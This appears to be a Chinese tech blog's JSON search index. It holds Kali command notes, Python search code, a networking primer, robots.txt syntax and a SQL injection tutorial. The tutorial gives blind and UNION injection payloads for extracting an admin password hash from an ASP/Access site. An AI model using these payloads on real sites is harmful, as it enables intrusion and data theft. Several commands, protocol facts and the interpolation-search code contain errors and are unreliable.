查看文本文件more /var/log/messages 显示一屏的内容，以百分比的显示，当看完一屏可以回车看下一屏tail -20 /var/log/messages 查看文本文件最后的20行内容watch -n 2 tail -20 /var/log/messages 查看文本文件最后的20行内容,每各两秒实时刷新一次当前文件文本信息mkdir+要创建的文件名touch &#123;a,b,c&#125;.txt 创建3个名为a,b,c.txt的文本cp -r test/zwj/ 将 test整个目录拷贝到 zwj下mr+文件名 执行删除功能的命令cp+要拷贝的文件+拷贝后的新文件名cp -r 文件目录名/ 新文件目录名 拷贝目录文件mr -rf 文件目录名 删除拷贝目录top 监测性能信息进程信息等kill PID 结束进程的作用ps aux 显示进程项目信息grep ssh /ext/passwd 查看passwd文件含有ssh字符串的信息ifconfig eth0 down 将网卡卸掉ifconfig eth0 up 启动网卡netstat -pantu 查看产生的TCP/UDP交互网络链接信息netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; 含有0.0.0和::: 被过滤掉不显示出来netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; 以netstat 的信息 输出第五列的信息netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 行内进行分块 只显示第一块netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort 行内进行分块 只显示第一块 对查出来的内容进行排序netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort | uniq 行内进行分块 只显示第一块 对查出来的内容进行排序，之后过滤重复的内容netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort | uniq &gt; ip 行内进行分块 只显示第一块 对查出来的内容进行排序，之后过滤重复的内容 导出到IP文本mount 挂载文件dmesg 查看messages 文件内容find / -name nmap 从根目录开始查找，叫nmap的文件find . -name &quot;ps*&quot; 当前目录下 ps开头的都查找出来find . -name &quot;ps*&quot; -exec cp &#123;&#125; /tmp/&#123;&#125;.bak \\; 当前目录下 ps开头的都查找出来 之后以.bak格式拷贝到tmp目录下whereis + 文件名 查看功能, 在使用whereis 之前先使用updatadb更新一下搜索的数据库，这样的话查找得更多的内容whereis + 文件名 -b 查看文件的二进制文件存放文件","categories":[{"name":"KaliLinux","slug":"KaliLinux","permalink":"https://xiaowuyoucy.github.io/categories/KaliLinux/"}],"tags":[{"name":"Kalinux","slug":"Kalinux","permalink":"https://xiaowuyoucy.github.io/tags/Kalinux/"}]},{"title":"拉格狼日查找算法","slug":"20190410250","date":"2019-03-30T21:08:18.000Z","updated":"2019-04-09T19:17:31.567Z","comments":true,"path":"2019/03/31/20190410250/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/03/31/20190410250/","excerpt":"","text":"拉格狼日查找算法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding=utf-8'''Created on 2019-03-31@author: Administrator'''import timedef costTime(func): def _costTime(finddata,findlist): starttime=time.time() func(finddata,findlist) endtime=time.time() print(endtime-starttime) return _costTime@costTimedef search(finddata,findlist): for data in findlist: if data==finddata: print(\"find\",data) return print(\"not find\")@costTimedef search2(finddata,findlist): low=0 #第一个 high=len(findlist)-1 #代表最后一个 times=0 while low&lt;=high: #不能重叠 times+=1 print(\"times\",times) mid=(low+high)//2 #取出中间索引 middata=findlist[mid] #取出中间数据 if finddata &lt;middata: #小于 淘汰1半 high =mid-1 elif finddata &gt;middata: #小于 淘汰1半 low =mid+1 else: print(\"find\",finddata,mid) return mid print(\"not find\") return -1@costTimedef search2lr(finddata,findlist): low=0 #第一个 high=len(findlist)-1 #代表最后一个 times=0 while low&lt;=high: #不能重叠 times+=1 print(\"times\",times) #mid=(low+high)//2 #取出中间索引 #mid= int( low +(high-low)* 0.5) datamid=((finddata-low)/(high-low)) #datamid=0.5 mid = int(low + (high - low) * datamid) middata=findlist[mid] #取出中间数据 if finddata &lt;middata: #小于 淘汰1半 high =mid-1 elif finddata &gt;middata: #小于 淘汰1半 low =mid+1 else: print(\"find\",finddata,mid) return mid print(\"not find\") return -1findlist=[x+0.1 for x in range(100000000)]finddata=98009999while True: finddata=eval(input(\"data\")) search2lr(finddata,findlist) #2.5050623416900635 拉格狼日插值算法 逐步插值，整体来说还是挺简单的，关键在于算法的部分，这里我运用了二维数组的数据结构来存储每次迭代后的新值。角标的循环初看可能有些复杂，自己动手走一遍就会很清楚啦 ，拉格狼日算法效率是二分查找的几十倍。 12345678910111213141516171819202122232425262728#coding=utf-8'''Created on 2019-03-31@author: Administrator'''def Neville(xt,m,n,x): for i in range(1,n): for j in range(1,n): w[i-j][i]=(x-xt[i-j])/(xt[i]-xt[i-j]) m[i][j]=m[i-1][j-1]+w[i-j][i]*(m[i][j-1]-m[i-1][j-1]) for i in range(n): for j in range(0,i+1): if j%n==0: print(\"\\n\") print(' %f' %m[i][j])n = int(input('插入节点个数:'))x = float(input('输入x的值:'))m = [[0 for i in range(n)] for j in range(n)] #创建n*n矩阵w = [[0 for i in range(n)] for j in range(n)]xt = [0]*nfor i in range(n): m[i][0] = float(input('插入第%d个y值：' %(i+1)))for i in range(n): xt[i] = float(input('插入第%d个x值：' %(i+1)))Neville(xt,m,n,x) 下面的是拉格朗日插值算法，十分简单，分享借鉴。 1234567891011121314151617181920212223242526#coding=utf-8'''Created on 2019-09-31@author: Administrator'''def lagrange(x,xt,yt,n): y = 0 for i in range(n): t = 1 for j in range(n): if i!=j: t = t*(x-xt[j])/(xt[i]-xt[j]) y = y+t*yt[i] print(\"结果为：%f\" %y)xt = []yt = []x = float(input(\"插值x；\"))n = int(input(\"节点数目；\"))for i in range(n): xt.append(float(input(\"第%d个x的值\" %(i+1))))for i in range(n): yt.append(float(input(\"第%d个x的值\" %(i+1)))) lagrange(x,xt,yt,n)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"拉格狼日","slug":"拉格狼日","permalink":"https://xiaowuyoucy.github.io/tags/拉格狼日/"}]},{"title":"网络协议","slug":"201503152349","date":"2019-03-15T15:49:08.000Z","updated":"2019-04-14T16:27:14.631Z","comments":true,"path":"2019/03/15/201503152349/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/03/15/201503152349/","excerpt":"","text":"应用层(Applicatio n Layer) 应用层是为操作系统或网络应用程序提供访问网络服务接口，应用层的协议包括：Telnet、FTP、HTTP、SNMP等等…应用层最终的目的不是解决用户各种具体的应用协议，应用层最终的任务是为用户提供服务。 这里说一下应用层的应用进程，应用进程是指正在运行的应用“程序” 而正在运行的程序都会有通讯的进程方式，这里面先涉及到应用程序的端口，应用程序的协议等，一个联网的应用程序，向外 部 通信时会在 自己的数据包的报头添加上端口号，然后在网络层和数据链路层分别添加上IP地址和MAC地址，将整个数据包发送到外网的主机，外网主机发送过来的数据，操作系统根据 端口号，把 相应的数据包发给 对应的 应用程序（通信软件)。而应用进程最终的目的是为了解决具体的应用问题而彼此通信的进程。 互联网应用层应用分布图： 我们来看看，因特网（(Internet ）最基本的三个应用 1.Email ​ 电子邮件客户程序：Outlook Express、foxmail等，这些 ​ 邮件客户程序→邮件服务器1 →邮件服务器2 →…… →目的邮件服务器→目的邮件客户程序 ​ 电子邮件采用的主要协议是POP3和SMTP SMTP:简单邮箱传输协议，用于电子邮件的传递，建立在UDP（也用TCP） 基础上，端口号25。 POP3：邮局协议（第三版），用于邮件管理和用户邮件的存取。建立在TCP基础上，端口号 110。 2.FTP ​ 允许不同的主机间传送文件，面向连接，基于TCP协议的传输程序， 协议拥有该主机的IP地址（主机域名）、账号、密码。 3.万维网（www） ​ 实际上是一个由千千万万个页面组成的信息网索取页面、浏览信息的程序称为浏览器（Browser，如Netscape、Internet Explorer等），浏览器与Web站点之间通过HTTP协议进行通信 HTTP：超文本传输协议用于传输超文本页面到客户机上，建立在TCP基础上，端口号=80。 应用层的通讯 下图是应用层的通讯过程 建立链接的前提是基于物理层开始的，通讯之间通过一列的物理链接设备（无线电波，光纤，双绞线），物理层通过高低电平工作，传输数据时会将高低电平转化成电信号，发送给被接收者，这些高低电平也就是0和1，通过数据链路层(ethenet)将电信号分组,这些0和1组成一串电信号(10101111) 而每一组的电信号都有特定对应的意义，我们都知道计算机最底层运算是二进制0和1， 就好比数据是字母“A” 要发送和接受两个过程之前都必须转化成电信号，计算机会通过某种机制将你要发送的数据“A”打散成电信号传输到接收方，接受方接受到之后会重新把这些电信号重组通过一层一层的的协议解析出数据这组0和1组成的电信号的意思“A” 这是大概的传输原理。 传输数据是必须遵循以太网（ethernet） 规定的 数据传输必须包含以下部分： 一组电信号的构成一个数据包，也叫做“针” 每一数据帧分成：报头head和数据data两部分 head data 头部(head) 是用来描述数据(data)代表的意义 ，头部包含三种信息 发送者/源地址，6个字节 接收者/目标地址，6个字节 数据类型，6个字节 为什么要有头部（head）信息呢？ 很简单是因为发送数据之前是需要明确，发送者，和接收着的，如果没有这些信息又怎么知道发送者是谁，接收者是谁呢？ 这些信息是在以太网报头定义的，以太网规定每一块网卡必须要有一个MAC地址，而这个MAC地址在网卡出厂之前都会被焊上，全世界独一无二的的MAC地址，MAC地址长度为48位二进制数，通常由12位16进制数表示（前六位是厂商编号，后六位是流水线号） 有了MAC地址之后可以满足于局域网内通讯了，局域网通信是基于UDP协议进行的，优点就是无需建立链接，具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。 但缺点就是，无法避免攻击的，比如：UDP Flood攻击…… UDP的缺点： 不可靠，不稳定 因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。 基于上面的优缺点，那么： 什么时候应该使用TCP： 当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。 在日常生活中，常见使用TCP协议的应用如下： 浏览器，用的HTTP FlashFXP，用的FTP Outlook，用的POP、SMTP Putty，用的Telnet、SSH QQ文件传输 ………… 什么时候应该使用UDP： 当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。 比如，日常生活中，常见使用UDP协议的应用如下： QQ语音 QQ视频 TFTP …… 跨局域网通讯 基于MAC地址方式，只是能够实现到我们在一个网段里通讯，一个数据包在发送到目标地址之前会进行子网掩码,算出是否在一个网段里，如果是同一个网段直接广播方式传输数据即可接收到，否则并不能让我们夸局域网通信，这里还需要涉及到网关，要包数据包发送出外网就必须把包交给网关，网关就好比一个代理人，网关接受到我们要发送出去的包之后，会将包发送给对方的网关，对方的网关将包拆开之后发现头部的信息来源以及接受的目标地址是谁，从而发送给接收者。 所以IP地址加MAC地址就是标识你全世界的这台机器在哪儿，有了这些基础之后并不够，这些基础只能让我们找到机器，假如现在要进行通讯服务，是基于一个软件上的互相的通讯，我要给对方发送信息，假如对方的机器上运行着无数的软件，那么这个包是不知道是哪个客户端的软件发来的数据，为了解决这一问题，在传输层里又出现了TCP/UDP 协议，这两者协议都是基于端口工作的，每个应用程序都对应着唯一的端口号，目前最大端口号为65536，超出范围的是无效端口，1024之前的端口号都是操作系统所用，超过1024之后的都是应用程序在用， 应用层协议开发者可以自己定义，也可以遵循通用的标准，我们的软件应用程序，都运行在应用层，归根结底应用层是产生数据的，产生数据之后会经过这五层协议，发送给接收者， 在应用层会封装头部信息，原MAC地址/目标MAC地址 ,到了传输层封装原端口/目标端口,到了网络层封原IP/目标IP，最后到了数据链路层封了原MAC/目标MAC，最后到了物理层将这些数据包打包成了电信号转换成二进制高低电平，发送给接收方，对方物理层接受到，到了数据链路层之后这些电信号进行成组，解包得到MAC地址，找到MAC地址之后，再往上一层网络层找，找到IP地址，之后到传输层找到端口对应产生数据的应用程序，最后到了对方的应用层，对方得到传输过去的数据。 主机上网过程 域名 Internet采用层次树状结构的命名方法，它使得任何一个连接在Internet上的主机或路由器都有一个唯一的层次结构的名字，即域名（Domain name）。所谓域(Domain)是域名空间中的一个子树。这个域的名字就是这个子树顶部结点的域名，一个域本身又可划分为若干个域(有时也称它们为子域)。例如：edu是标识教育系统的一个大的域，而tsinghua.edu和besti.edu则是edu域中的两个子域。 目前Internet顶级域名分为三大类： 国家顶级域名：采用ISO 3166规定。如cn表示中国，us表示美国等 国际顶级域名：采用int。国际性的组织可在int下注册。 通用顶级域名：如下表所列。 域名 组织类型 域名 组织类型 com 商业机构 firm 公司企业 edu 教育部门 shop 销售公司与企业 gov 政府部门 web 突出万维网服务单位 org 非商业组织 arts 突出文化艺术活动单位 net 网络服务机构 rec 突出逍遥娱乐活动单位 mil 美国军队组织 info 提供信息服务 nom 个人 域名DNS服务系统 在DNS中由域名服务器（DNS Server）完成域名与IP地址的转换过程，这个过程称为域名解析 域名服务器主要分为以下几个： 1．本地域名服务器 2．根域名服务器 3．授权域名服务器 认识URL url的组成部分（unifrom resource locator） 例如：https://www.microsoft.com/china/index.html https:// 这里是代表超文本传输协议，通知microsoft.com服务器显示Web页面 www 代表一个web(万维网) 服务器; Microsoft.com/ 这是装有页面的服务器的域名，或站点服务器名称; China/ 为该服务器上的子目录，就好像我们的文件夹; index.html 是文件夹中的html文件（网页）。 HTTP是如何工作的？ HTTP客户端启动TCP连接(创建套接字) 到服务器, 端口 80。一旦建立连接，浏览器进程和服务器进程就可以通过各自的套接字来访问，http 报文(应用层协议报文) 在浏览器 (http client) 和Web服务器(http server)之间进行交换。 客户端套接字。客户往自己的套接字发送HTTP请求消息，也从自己的套接字接收HTTP响应消息，服务器从自己的套接字接收HTTP请求消息，也往自己的套接字发送HTTP响应消息。 持久性与非持久性 非持久连接和持久连接 HTTP既可以使用非持久连接(non-persistent connection)，也可以使用持久连接(persistent connection)。HTTP/1.0使用非持久连接，HTTP/1.1默认使用持久连接。 非持久性链接： ​ 非持久连接情况下从服务器到客户传送一个Web页面的步骤。假设该页面由1个基本HTML文件和10个JPEG图像构成，而且所有这些对象都存放在同一台服务器主机中。 再假设该基本HTML文件的URL为： http://www.besti.edu.cn/somepath/index.html 下面是具体步骤: 1.HTTP客户初始化一个与服务器主机www.besti.edu.cn中的HTTP服务器的TCP连接。HTTP服务器使用默认端口号80监听来自HTTP客户的连接建立请求。 2.HTTP客户经由与TCP连接相关联的本地套接字发出一个HTTP请求消息。这个消息中包含路径名/somepath/index.html。 2.HTTP服务器经由与TCP连接相关联的本地套接字接收这个请求消息，再从服务器主机的内存或硬盘中取出对象/somepath/index.html，经由同一个套接字发出包含该对象的响应消息。 3.HTTP服务器告知TCP关闭这个TCP连接(不过TCP要到客户收到刚才这个响应消息之后才会真正终止这个连接)。 4.HTTP客户经由同一个套接字接收这个响应消息。TCP连接随后终止。该消息标明所封装的对象是一个HTML文件。客户从中取出这个文件，加以分析后发现其中有10个JPEG对象的引用。 6.给每一个引用到的JPEG对象重复步骤1-4。 持久性链接 持久连接情况下，服务器在发出响应后让TCP连接继续打开着。同一对客户/服务器之间的后续请求和响应可以通过这个连接发送，通常，HTTP服务器在某个连接闲置一段特定时间后关闭它，而这段时间通常是可以配置的。 持久连接分为不带流水线(without pipelining)和带流水线(with pipelining)两个版本。如果是不带流水线的版本，那么客户只在收到前一个请求的响应后才发出新的请求。 HTTP/1.1的默认模式使用带流水线的持久连接。这种情况下，HTTP客户每碰到一个引用就立即发出一个请求，因而HTTP客户可以一个接一个紧挨着发出各个引用对象的请求。服务器收到这些请求后，也可以一个接一个紧挨着发出各个对象。 HTTP规范1.0[RPcl945]和HTTP1.1 [RFC 2616]定义了HTTP消息的格式。HTTP消息分为请求消息和响应消息两类。 68} HTTP请求消息: 12345GET /somedir/page.html HTTP/1.1 Host:www.besti.edu.cn Connection:closeUser-agent:Mozilla/4.0 Accept-language:zh-cn HTTP请求标准格式 Request 附属体不在GET方法中使用，而是在POST方法中使用。 POST方法适用于需由用户填写表单的场合，如往google搜索引擎中填入待搜索的词。用户提交表单后， HEAD方法与GET方法类似，两者的差别只是服务器在对HEAD方法的响应消息中去掉了所请求的对象，其他内容则与对GET方法的响应消息一样。HEAD方法通常用于HTTP服务器软件开发人员进行调试。 POST方法示例 12345678POST /HTTP/1.1Host: www.wrox.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)Gecko/20050225 Firefox/1.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 40Connection: Keep-Alivename=Professional%20Ajax&amp;publisher=Wiley HTTP响应消息 12345678HTTP/1.1 200 OKConnection:closeDate: Thu, 13 Oct 2005 03:17:33 GMTServer: Apache/2.0.54 (Unix)Last—Modified:Mon,22 Jun 1998 09;23;24 GMTContent—Length:682lContent—Type:text/html(数据 数据 数据 数据 数据…………) HTTP响应标准格式 Response 响应报文的开始行是状态行,状态行包括三项内容，即 HTTP 的版本，状态码，以及解释状态码的简单短语。 HTTP常用状态码 1xx 表示通知信息的，如请求收到了或正在进行处理。 2xx 表示成功，如接受或知道了。 3xx 表示重定向，表示要完成请求还必须采取进一步的行动。 4xx 表示客户的差错，如请求中有错误的语法或不能完成。 5xx 表示服务器的差错，如服务器失效无法完成请求。 ●200 OK;请求成功，所请求信息在响应消息中返回。 ●301 Moved Permanently:所请求的对象己永久性迁移; ​ 新的URL在本响应消息的Location:头部指出。客户软件会自动请求这个新的URL。 ●400 Bad Request;表示服务器无法理解相应请求的普通错误的状态码 ●404 Not Found:服务器上不存在所请求的文档。 ●HTTP Version Not Support:服务器不支持所请求的HTTP协议版本。 三次握手","categories":[{"name":"网络协议","slug":"网络协议","permalink":"https://xiaowuyoucy.github.io/categories/网络协议/"}],"tags":[{"name":"网络模型","slug":"网络模型","permalink":"https://xiaowuyoucy.github.io/tags/网络模型/"},{"name":"ISO七层模型","slug":"ISO七层模型","permalink":"https://xiaowuyoucy.github.io/tags/ISO七层模型/"}]},{"title":"WEB渗透偏之SQL注入","slug":"201812282306","date":"2018-12-28T14:43:02.000Z","updated":"2019-04-23T14:45:42.377Z","comments":true,"path":"2018/12/28/201812282306/","link":"","permalink":"https://xiaowuyoucy.github.io/2018/12/28/201812282306/","excerpt":"","text":"不管用什么语言编写的web应用，它们都有一个共同点，就是具有交互性并且大多数是数据库驱动的，WEB应用随处可见，因此存在的SQL注入是影响企业运营最具破坏性的漏洞，SQL注入就是通过操作SQL语句进行攻击的从而达到攻击的目的，我们通常在网上能够看到的，某某网站被脱，某某网站被脱裤，那么这些很大可能就是通过SQL注入来实现的，通常渗透者攻击的目的是得到数据库相关的信息，例如账号密码，用户信息等等。 二. SQL注入是如何产生的呢？ 简单的来说，网站新闻内容，会员中心，查询等都会和数据库进行关联，其中在数据之间交互中，传输的就是SQL语句，攻击者通过操作SQL语句来达到SQL注入攻击。 三. SQL注入漏洞能造成哪些危害呢？ 常见的操作： 网站数据库信息泄露 网站数据被修改 网站整站程序源码被Download 架设网站的服务器被入侵挂木马等等… 四. SQL注入原理分析 可注入是因为网站程序存在可控传递参数，参数未进行过滤直接带入数据库查询，导致攻击者可通过传递恶意sql语句代码进行执行攻击。 SQL注入的产生条件 必须有传输传递 传输值带入数据库查询并执行 我们来看一个基本网站组成的url链接： 网站地址： http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 网站地址：http://127.0.0.1/0/ 文件目录：Production 文件名：PRODUCT_DETAIL.asp 参数名：id 参数值：1513 首先是有网站地址—&gt;文件目录—&gt;文件名—&gt;参数名—&gt;参数值 基于这种链接我们可以尝试在参数1513后面再随便传递一些参数比如dddd，如果报错，是因为在接受1513这个ID值的时候后把dddd也传递过去了，这个情况我们称之为SQL带入查询。 显然刚才不是SQL语句，所以报错了，一般情况下如果参数只接收不带入查询的话我们无论输入什么都不会有任何报错的迹象，证明是不存在SQL注入点的，能够带入查询是因为网站没有对参数进行过滤，所以导致带入查询，那么试想一下假设我带入查询是SQL语句，这语句的操作是查看网站用户信息或者密码的这时候是不是很危险呢？ 测试题 1.下面那些地址可能存在sql注入？ A.www.cnblog.io/news.asp B.www.cnblog.io/index.asp?page=11 C.www.cnblog.io/news.asp?id=1&amp;page=2 D.www.cnblog.io/?id=11 2.已知cnblog.io/news.asp?id=1&amp;page=1 中参数id存在注入，下面那个注入测试正确？ A.cnblog.io/news.asp?id=1 and 1=1&amp;page=1 B.cnblog.io/news.asp?id=1&amp;page=1 and 1=1 C.cnblog.io/news.asp?id=1 and 1=1&amp;page=1 and 1=1 cnblog.io/news.asp?id=1&amp;page=1 and 1=1 将注入参数设为page（工具检测不出） cnblog.io/news.asp?page=1&amp;id=1 将注入参数设为id 前面我们说到，只所以能够带入数据库查询是因为网站没有对参数进行过滤，也就是说编写网站的人在写这个业务逻辑代码有BUG， 我们来看看如下的一串代码案例，这次代码是没有对参数进行过滤的，存在带入数据库查询的操作。 1234567PRODUCT_DETAIL.asp代码：&lt;%id=request(&quot;id&quot;) 接受参数名id的值并赋值给变量id （前面id=变量，后面id=参数名）sql=&quot;select * from product where id=&quot;&amp;id 组合变量id的sql语句set rs=conn.execute(sql) 执行sql语句%&gt; http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 select * from product where id=1513 我们来看一下PRODUCT_DETAIL.asp里面的id=request(“id”)其中id是等于变量 request(‘id’)接受参数的值并且赋值给了变量ID， 这时sql语句组合select * from product where id=1513， 1513是接收到的网站参数，那么这个页面存在肯定是返回正常的。 http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513’ select * from product where id=1513’ 页面报错，无此id 看上行的链接和SQL语句组合，当在网站链接的id参数后面多家了一个’ 这时SQL语句执行错误报错返回错误页面，证明我们可以任意带入参数查询的，那么大家想假设我在参数后面带入的是sql查询语句是不是能够查到数据库的信息呢，这就是SQL注入对网站危害之处。 判断注入点常用的逻辑语 数学逻辑运算符： 或 且 非(or and xor) 真且真=真 假且真=假 真或真=真 真或假=真 用法是在网站链接参数后面加上逻辑判断法 id=1513 and 1=1 那么加上之后，这是SQL语句是这样组合的 select * from product where id=1513 and 1=1 真且真=真 返回正常 因为这是真逻辑所以返回真，我们 加上and 1 = 11 , 这是SQL语句是这样组合的 select * from product where id=1513 and 1=11 真且假=假 返回错误，这时我们可以确定注入点的存在，我们重新组SQL语句可以在参数后面进行传达相关的恶意sql语句来达到带入数据库查询的目的 那么判断到有注入点之后，我们怎么猜数据库里面的信息呢？ 这里需要了解一个分层结构。 ACCESS数据库 表名 列名 数据 通过以上四部我们可以得到数据，首先是过表名来得到列名，再通过列名最后得到数据的。 总结分为4步 判断注入 猜解表名 猜解列名 猜解数据 接下来我们搭建个测试环境来进行实战一下注入的操作， 以access数据库为例，首先猜表明，在参数id=1513 后面传入， 猜表明的语句首先是判断有多少个字段，语句是order by 22，如下图 当回车的时候页面返回是正常的，那么我们继续判断order by 23 这次我填的字段是23 返回了错误页面因此可见表名的字段不等于23，那么可以确定表名的字段是&lt;=22的。 找到表名的字段长度之后我们继续进行猜列名的操作语句如下 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin 这段SQL语句的意思是 查询有没有admin这个表，我们一般做渗透猜解的大部分是admin表，因为这通常是一些管理员信息，如账号密码等，我们把上面语句带入查询一下，一般情况下如果存在admin这个表名的话， 网页会随机爆出一些数字，我们得到这些具体数字之后，可以对应着字段去查列名相关信息了，之后能得到数据。 得到的数字是3和15，那么我们可以在3和15字段利填写相关列名的信息，如果存在这个列名，那么就会爆出相关的数据，一般列名常见要爆的都是一些密码和账号信息列名如果存在的话就会爆出相关的数据信息，如下图 字段15填的是admin爆出了管理员账号，字段3填的是password爆出的是一个md5值，md5值我们可以进行md5解密得到真正的密码如下图所示 得到明文“bendss” 我们可以尝试用管理员的账号密码登录一下网站后台。 OK 能够成功登录，证明我们猜解出来的账号密码是正确的。 换第二种猜解方式，来尝试一下猜解，刚才的猜解方式叫联合查询法，联合查询法和逐字才猜解法是有一定区别的， 逐字才猜解法，兼容性强，一般的注入工具猜解的都是采用:逐字猜解法如明小子，阿迪，萝卜头，穿山甲等注入工具，因为联合查询法有时候猜解不出来，明明存在注入点都猜解不出来来，兼容性不强。 猜解语法： 查表：and exists (select * from 表名) 查列：and exists (select 列名 from 表名) 查数据：1.确定长度 2.确定asc数据(asc编码) and (select top 1 len(列名) from admin)=5 and (select top 1 asc(mid(列名,位数,1)) from admin)=97 and (select top 1 asc(mid(列名,位数,1)) from admin)=97 依然是先猜表名，我们使用 and exists (select * from admin) 语句来猜解一下 admin表是否存在，如果存在就返回正常，返回错误就代表不存在早 确定admin表存在之后，我们来猜一下列名，使用1. 查列：and exists (select username from admin) 来猜解， 如果返回错误则是代表这个列名不存在。 然而这个列名是不存在的，我们换一个试试,换成密码列名 exists (select password from admin) 看结果是返回正常页面的，证明有password这个表，接下来我们确定一下这个表的长度，使用 and (select top 1 len(password) from admin)=5 第一次我猜解的长度设置为5，返回的结果是错误页面，证明长度并不是等于5， 我们再把长度设置为&gt;=5如果返回正常页面说明，这个列名长度肯定是大于5或者等于5的 看上图返回正确页面了，我们都知道一般像这些网站管理员密码通常都采用md5加密，所以一般的md5加密长度为16的，我们再把长度的值选择17位试试，如果返回错误，我们再设置回16，如果返回正确那么证明，这个列名的长度等于16位的md5加密长度。 事实证明，长度不也不等于17位，那么再把长度设置为16位看看，如果返回正确页面基本上，可以断定是16位的md5加密值了 事实证明，这个密码列名的长度为16位的md5加密值， 好以上的基本猜解步骤已经完成，我们可以着手猜列名的内容， 使用语法 and (select top 1 asc(mid(password,1,1)) from admin)=97 mid()里面的password代表是列名,1是代表猜16位长度的第一位的值内容，后面=97是ascii编码97对应的是a,如下是ascii码的对应表。 我们明白了怎么回事之后就开始猜解吧 回车： 好，回车之后发现返回页面的结果是正确的，证明16位的md5值第一位是97ascii码表的对应值，也就是“a” 接下来我们猜第二位， 这次我把值设置为&lt;=52 发现是正确的，那么说明这个结果可能少于52又或者等于52，所以继续猜，最后我发现这个结果是等于52。 所以是ascii码对应的值“4”，以此类推，值到把16位md5值猜解完毕，猜解得到的md5值，就可以进行md5解密了。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://xiaowuyoucy.github.io/tags/sql注入/"},{"name":"web渗透","slug":"web渗透","permalink":"https://xiaowuyoucy.github.io/tags/web渗透/"}]},{"title":"Robots文件中的配置说明","slug":"201812282242","date":"2018-12-28T14:43:02.000Z","updated":"2019-04-07T14:04:18.077Z","comments":true,"path":"2018/12/28/201812282242/","link":"","permalink":"https://xiaowuyoucy.github.io/2018/12/28/201812282242/","excerpt":"","text":"*表示所有搜索引擎，用于指定蜘蛛使用； ~表示以某字符串开头； $表示以某字符串结尾； /表示当前目录下的所有内容。 格式 User-agent: 蜘蛛名称； Disallow: 内容名称； Allow:内容名称； 参数说明 User-agent 指定搜索引擎蜘蛛名称； Disallow要禁止抓取的内容； Allow允许抓取的内容。 Robots文件写法参考 指定蜘蛛：User-agent:* 。这里的*代表的所有的搜索引擎种类，*是一个通配符。 禁止写法 Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录； Disallow: /admin 这里定义是禁止爬寻admin目录； Disallow: /cgi-bin/*.htm 禁止访问/cgi-bin/目录下所有以“.htm”为后缀URL（包含子目录）； Disallow: /？ 禁止访问网站中所有包含问号（？）的网址； Disallow: /.jpg$ 禁止抓取网页所有的.jpg格式的图片； Disallow:/ab/adc.html 禁止爬取ab文件夹下面的adc.html文件。 允许写法 Allow: /cgi-bin/ 这里定义是允许爬寻cgi-bin目录下面的目录； Allow: /tmp 这里定义是允许爬寻tmp的整个目录； Allow: .htm$ 仅允许访问以&quot;.htm&quot;为后缀的URL； Allow: .gif$ 允许抓取网页和gif格式图片。 各大搜索引擎蜘蛛的名称写法 1、百度蜘蛛：Baiduspider 百度蜘蛛名称为Baiduspider日志中还发现了Baiduspider-mobile（抓取wap）、Baiduspider-image（抓取图片）、Baiduspider-video（抓取视频）、Baiduspider-news（抓取新闻）。以上百度蜘蛛目前常见的是Baiduspider和Baiduspider-image两种。 2、谷歌蜘蛛：Googlebot ，Googlebot-Mobile，看名字是抓取wap内容的 3、360蜘蛛：360Spider，这个家伙比较勤劳 4、SOSO蜘蛛：Sosospider，比360更加勤劳 5、雅虎蜘蛛：Yahoo! Slurp China 6、有道蜘蛛：YoudaoBot 7、搜狗蜘蛛：Sogou News Spider 搜狗蜘蛛还包括如下这些：Sogou web spider、Sogou inst spider、Sogou spider2、Sogou blog、Sogou News Spider、Sogou Orion spider，等等、、、、、、 8、MSN蜘蛛：msnbot，msnbot-media 9、必应蜘蛛：bingbot 10、一搜蜘蛛：YisouSpider 11、Alexa蜘蛛：ia_archiver 12、宜搜蜘蛛：EasouSpider 13、即刻蜘蛛：JikeSpider 14、一淘网蜘蛛：EtaoSpider","categories":[{"name":"技术资讯","slug":"技术资讯","permalink":"https://xiaowuyoucy.github.io/categories/技术资讯/"}],"tags":[{"name":"SEO网站优化","slug":"SEO网站优化","permalink":"https://xiaowuyoucy.github.io/tags/SEO网站优化/"}]},{"title":"urlib2库的基本使用","slug":"201902262135","date":"2017-07-23T09:20:34.000Z","updated":"2019-04-14T18:24:45.251Z","comments":true,"path":"2017/07/23/201902262135/","link":"","permalink":"https://xiaowuyoucy.github.io/2017/07/23/201902262135/","excerpt":"","text":"所谓⽹⻚抓取，就是把 URL 地址中指定的⽹络资源从⽹络流中读取出来，保存到本地。 在 Python 中，我们使⽤ urllib2 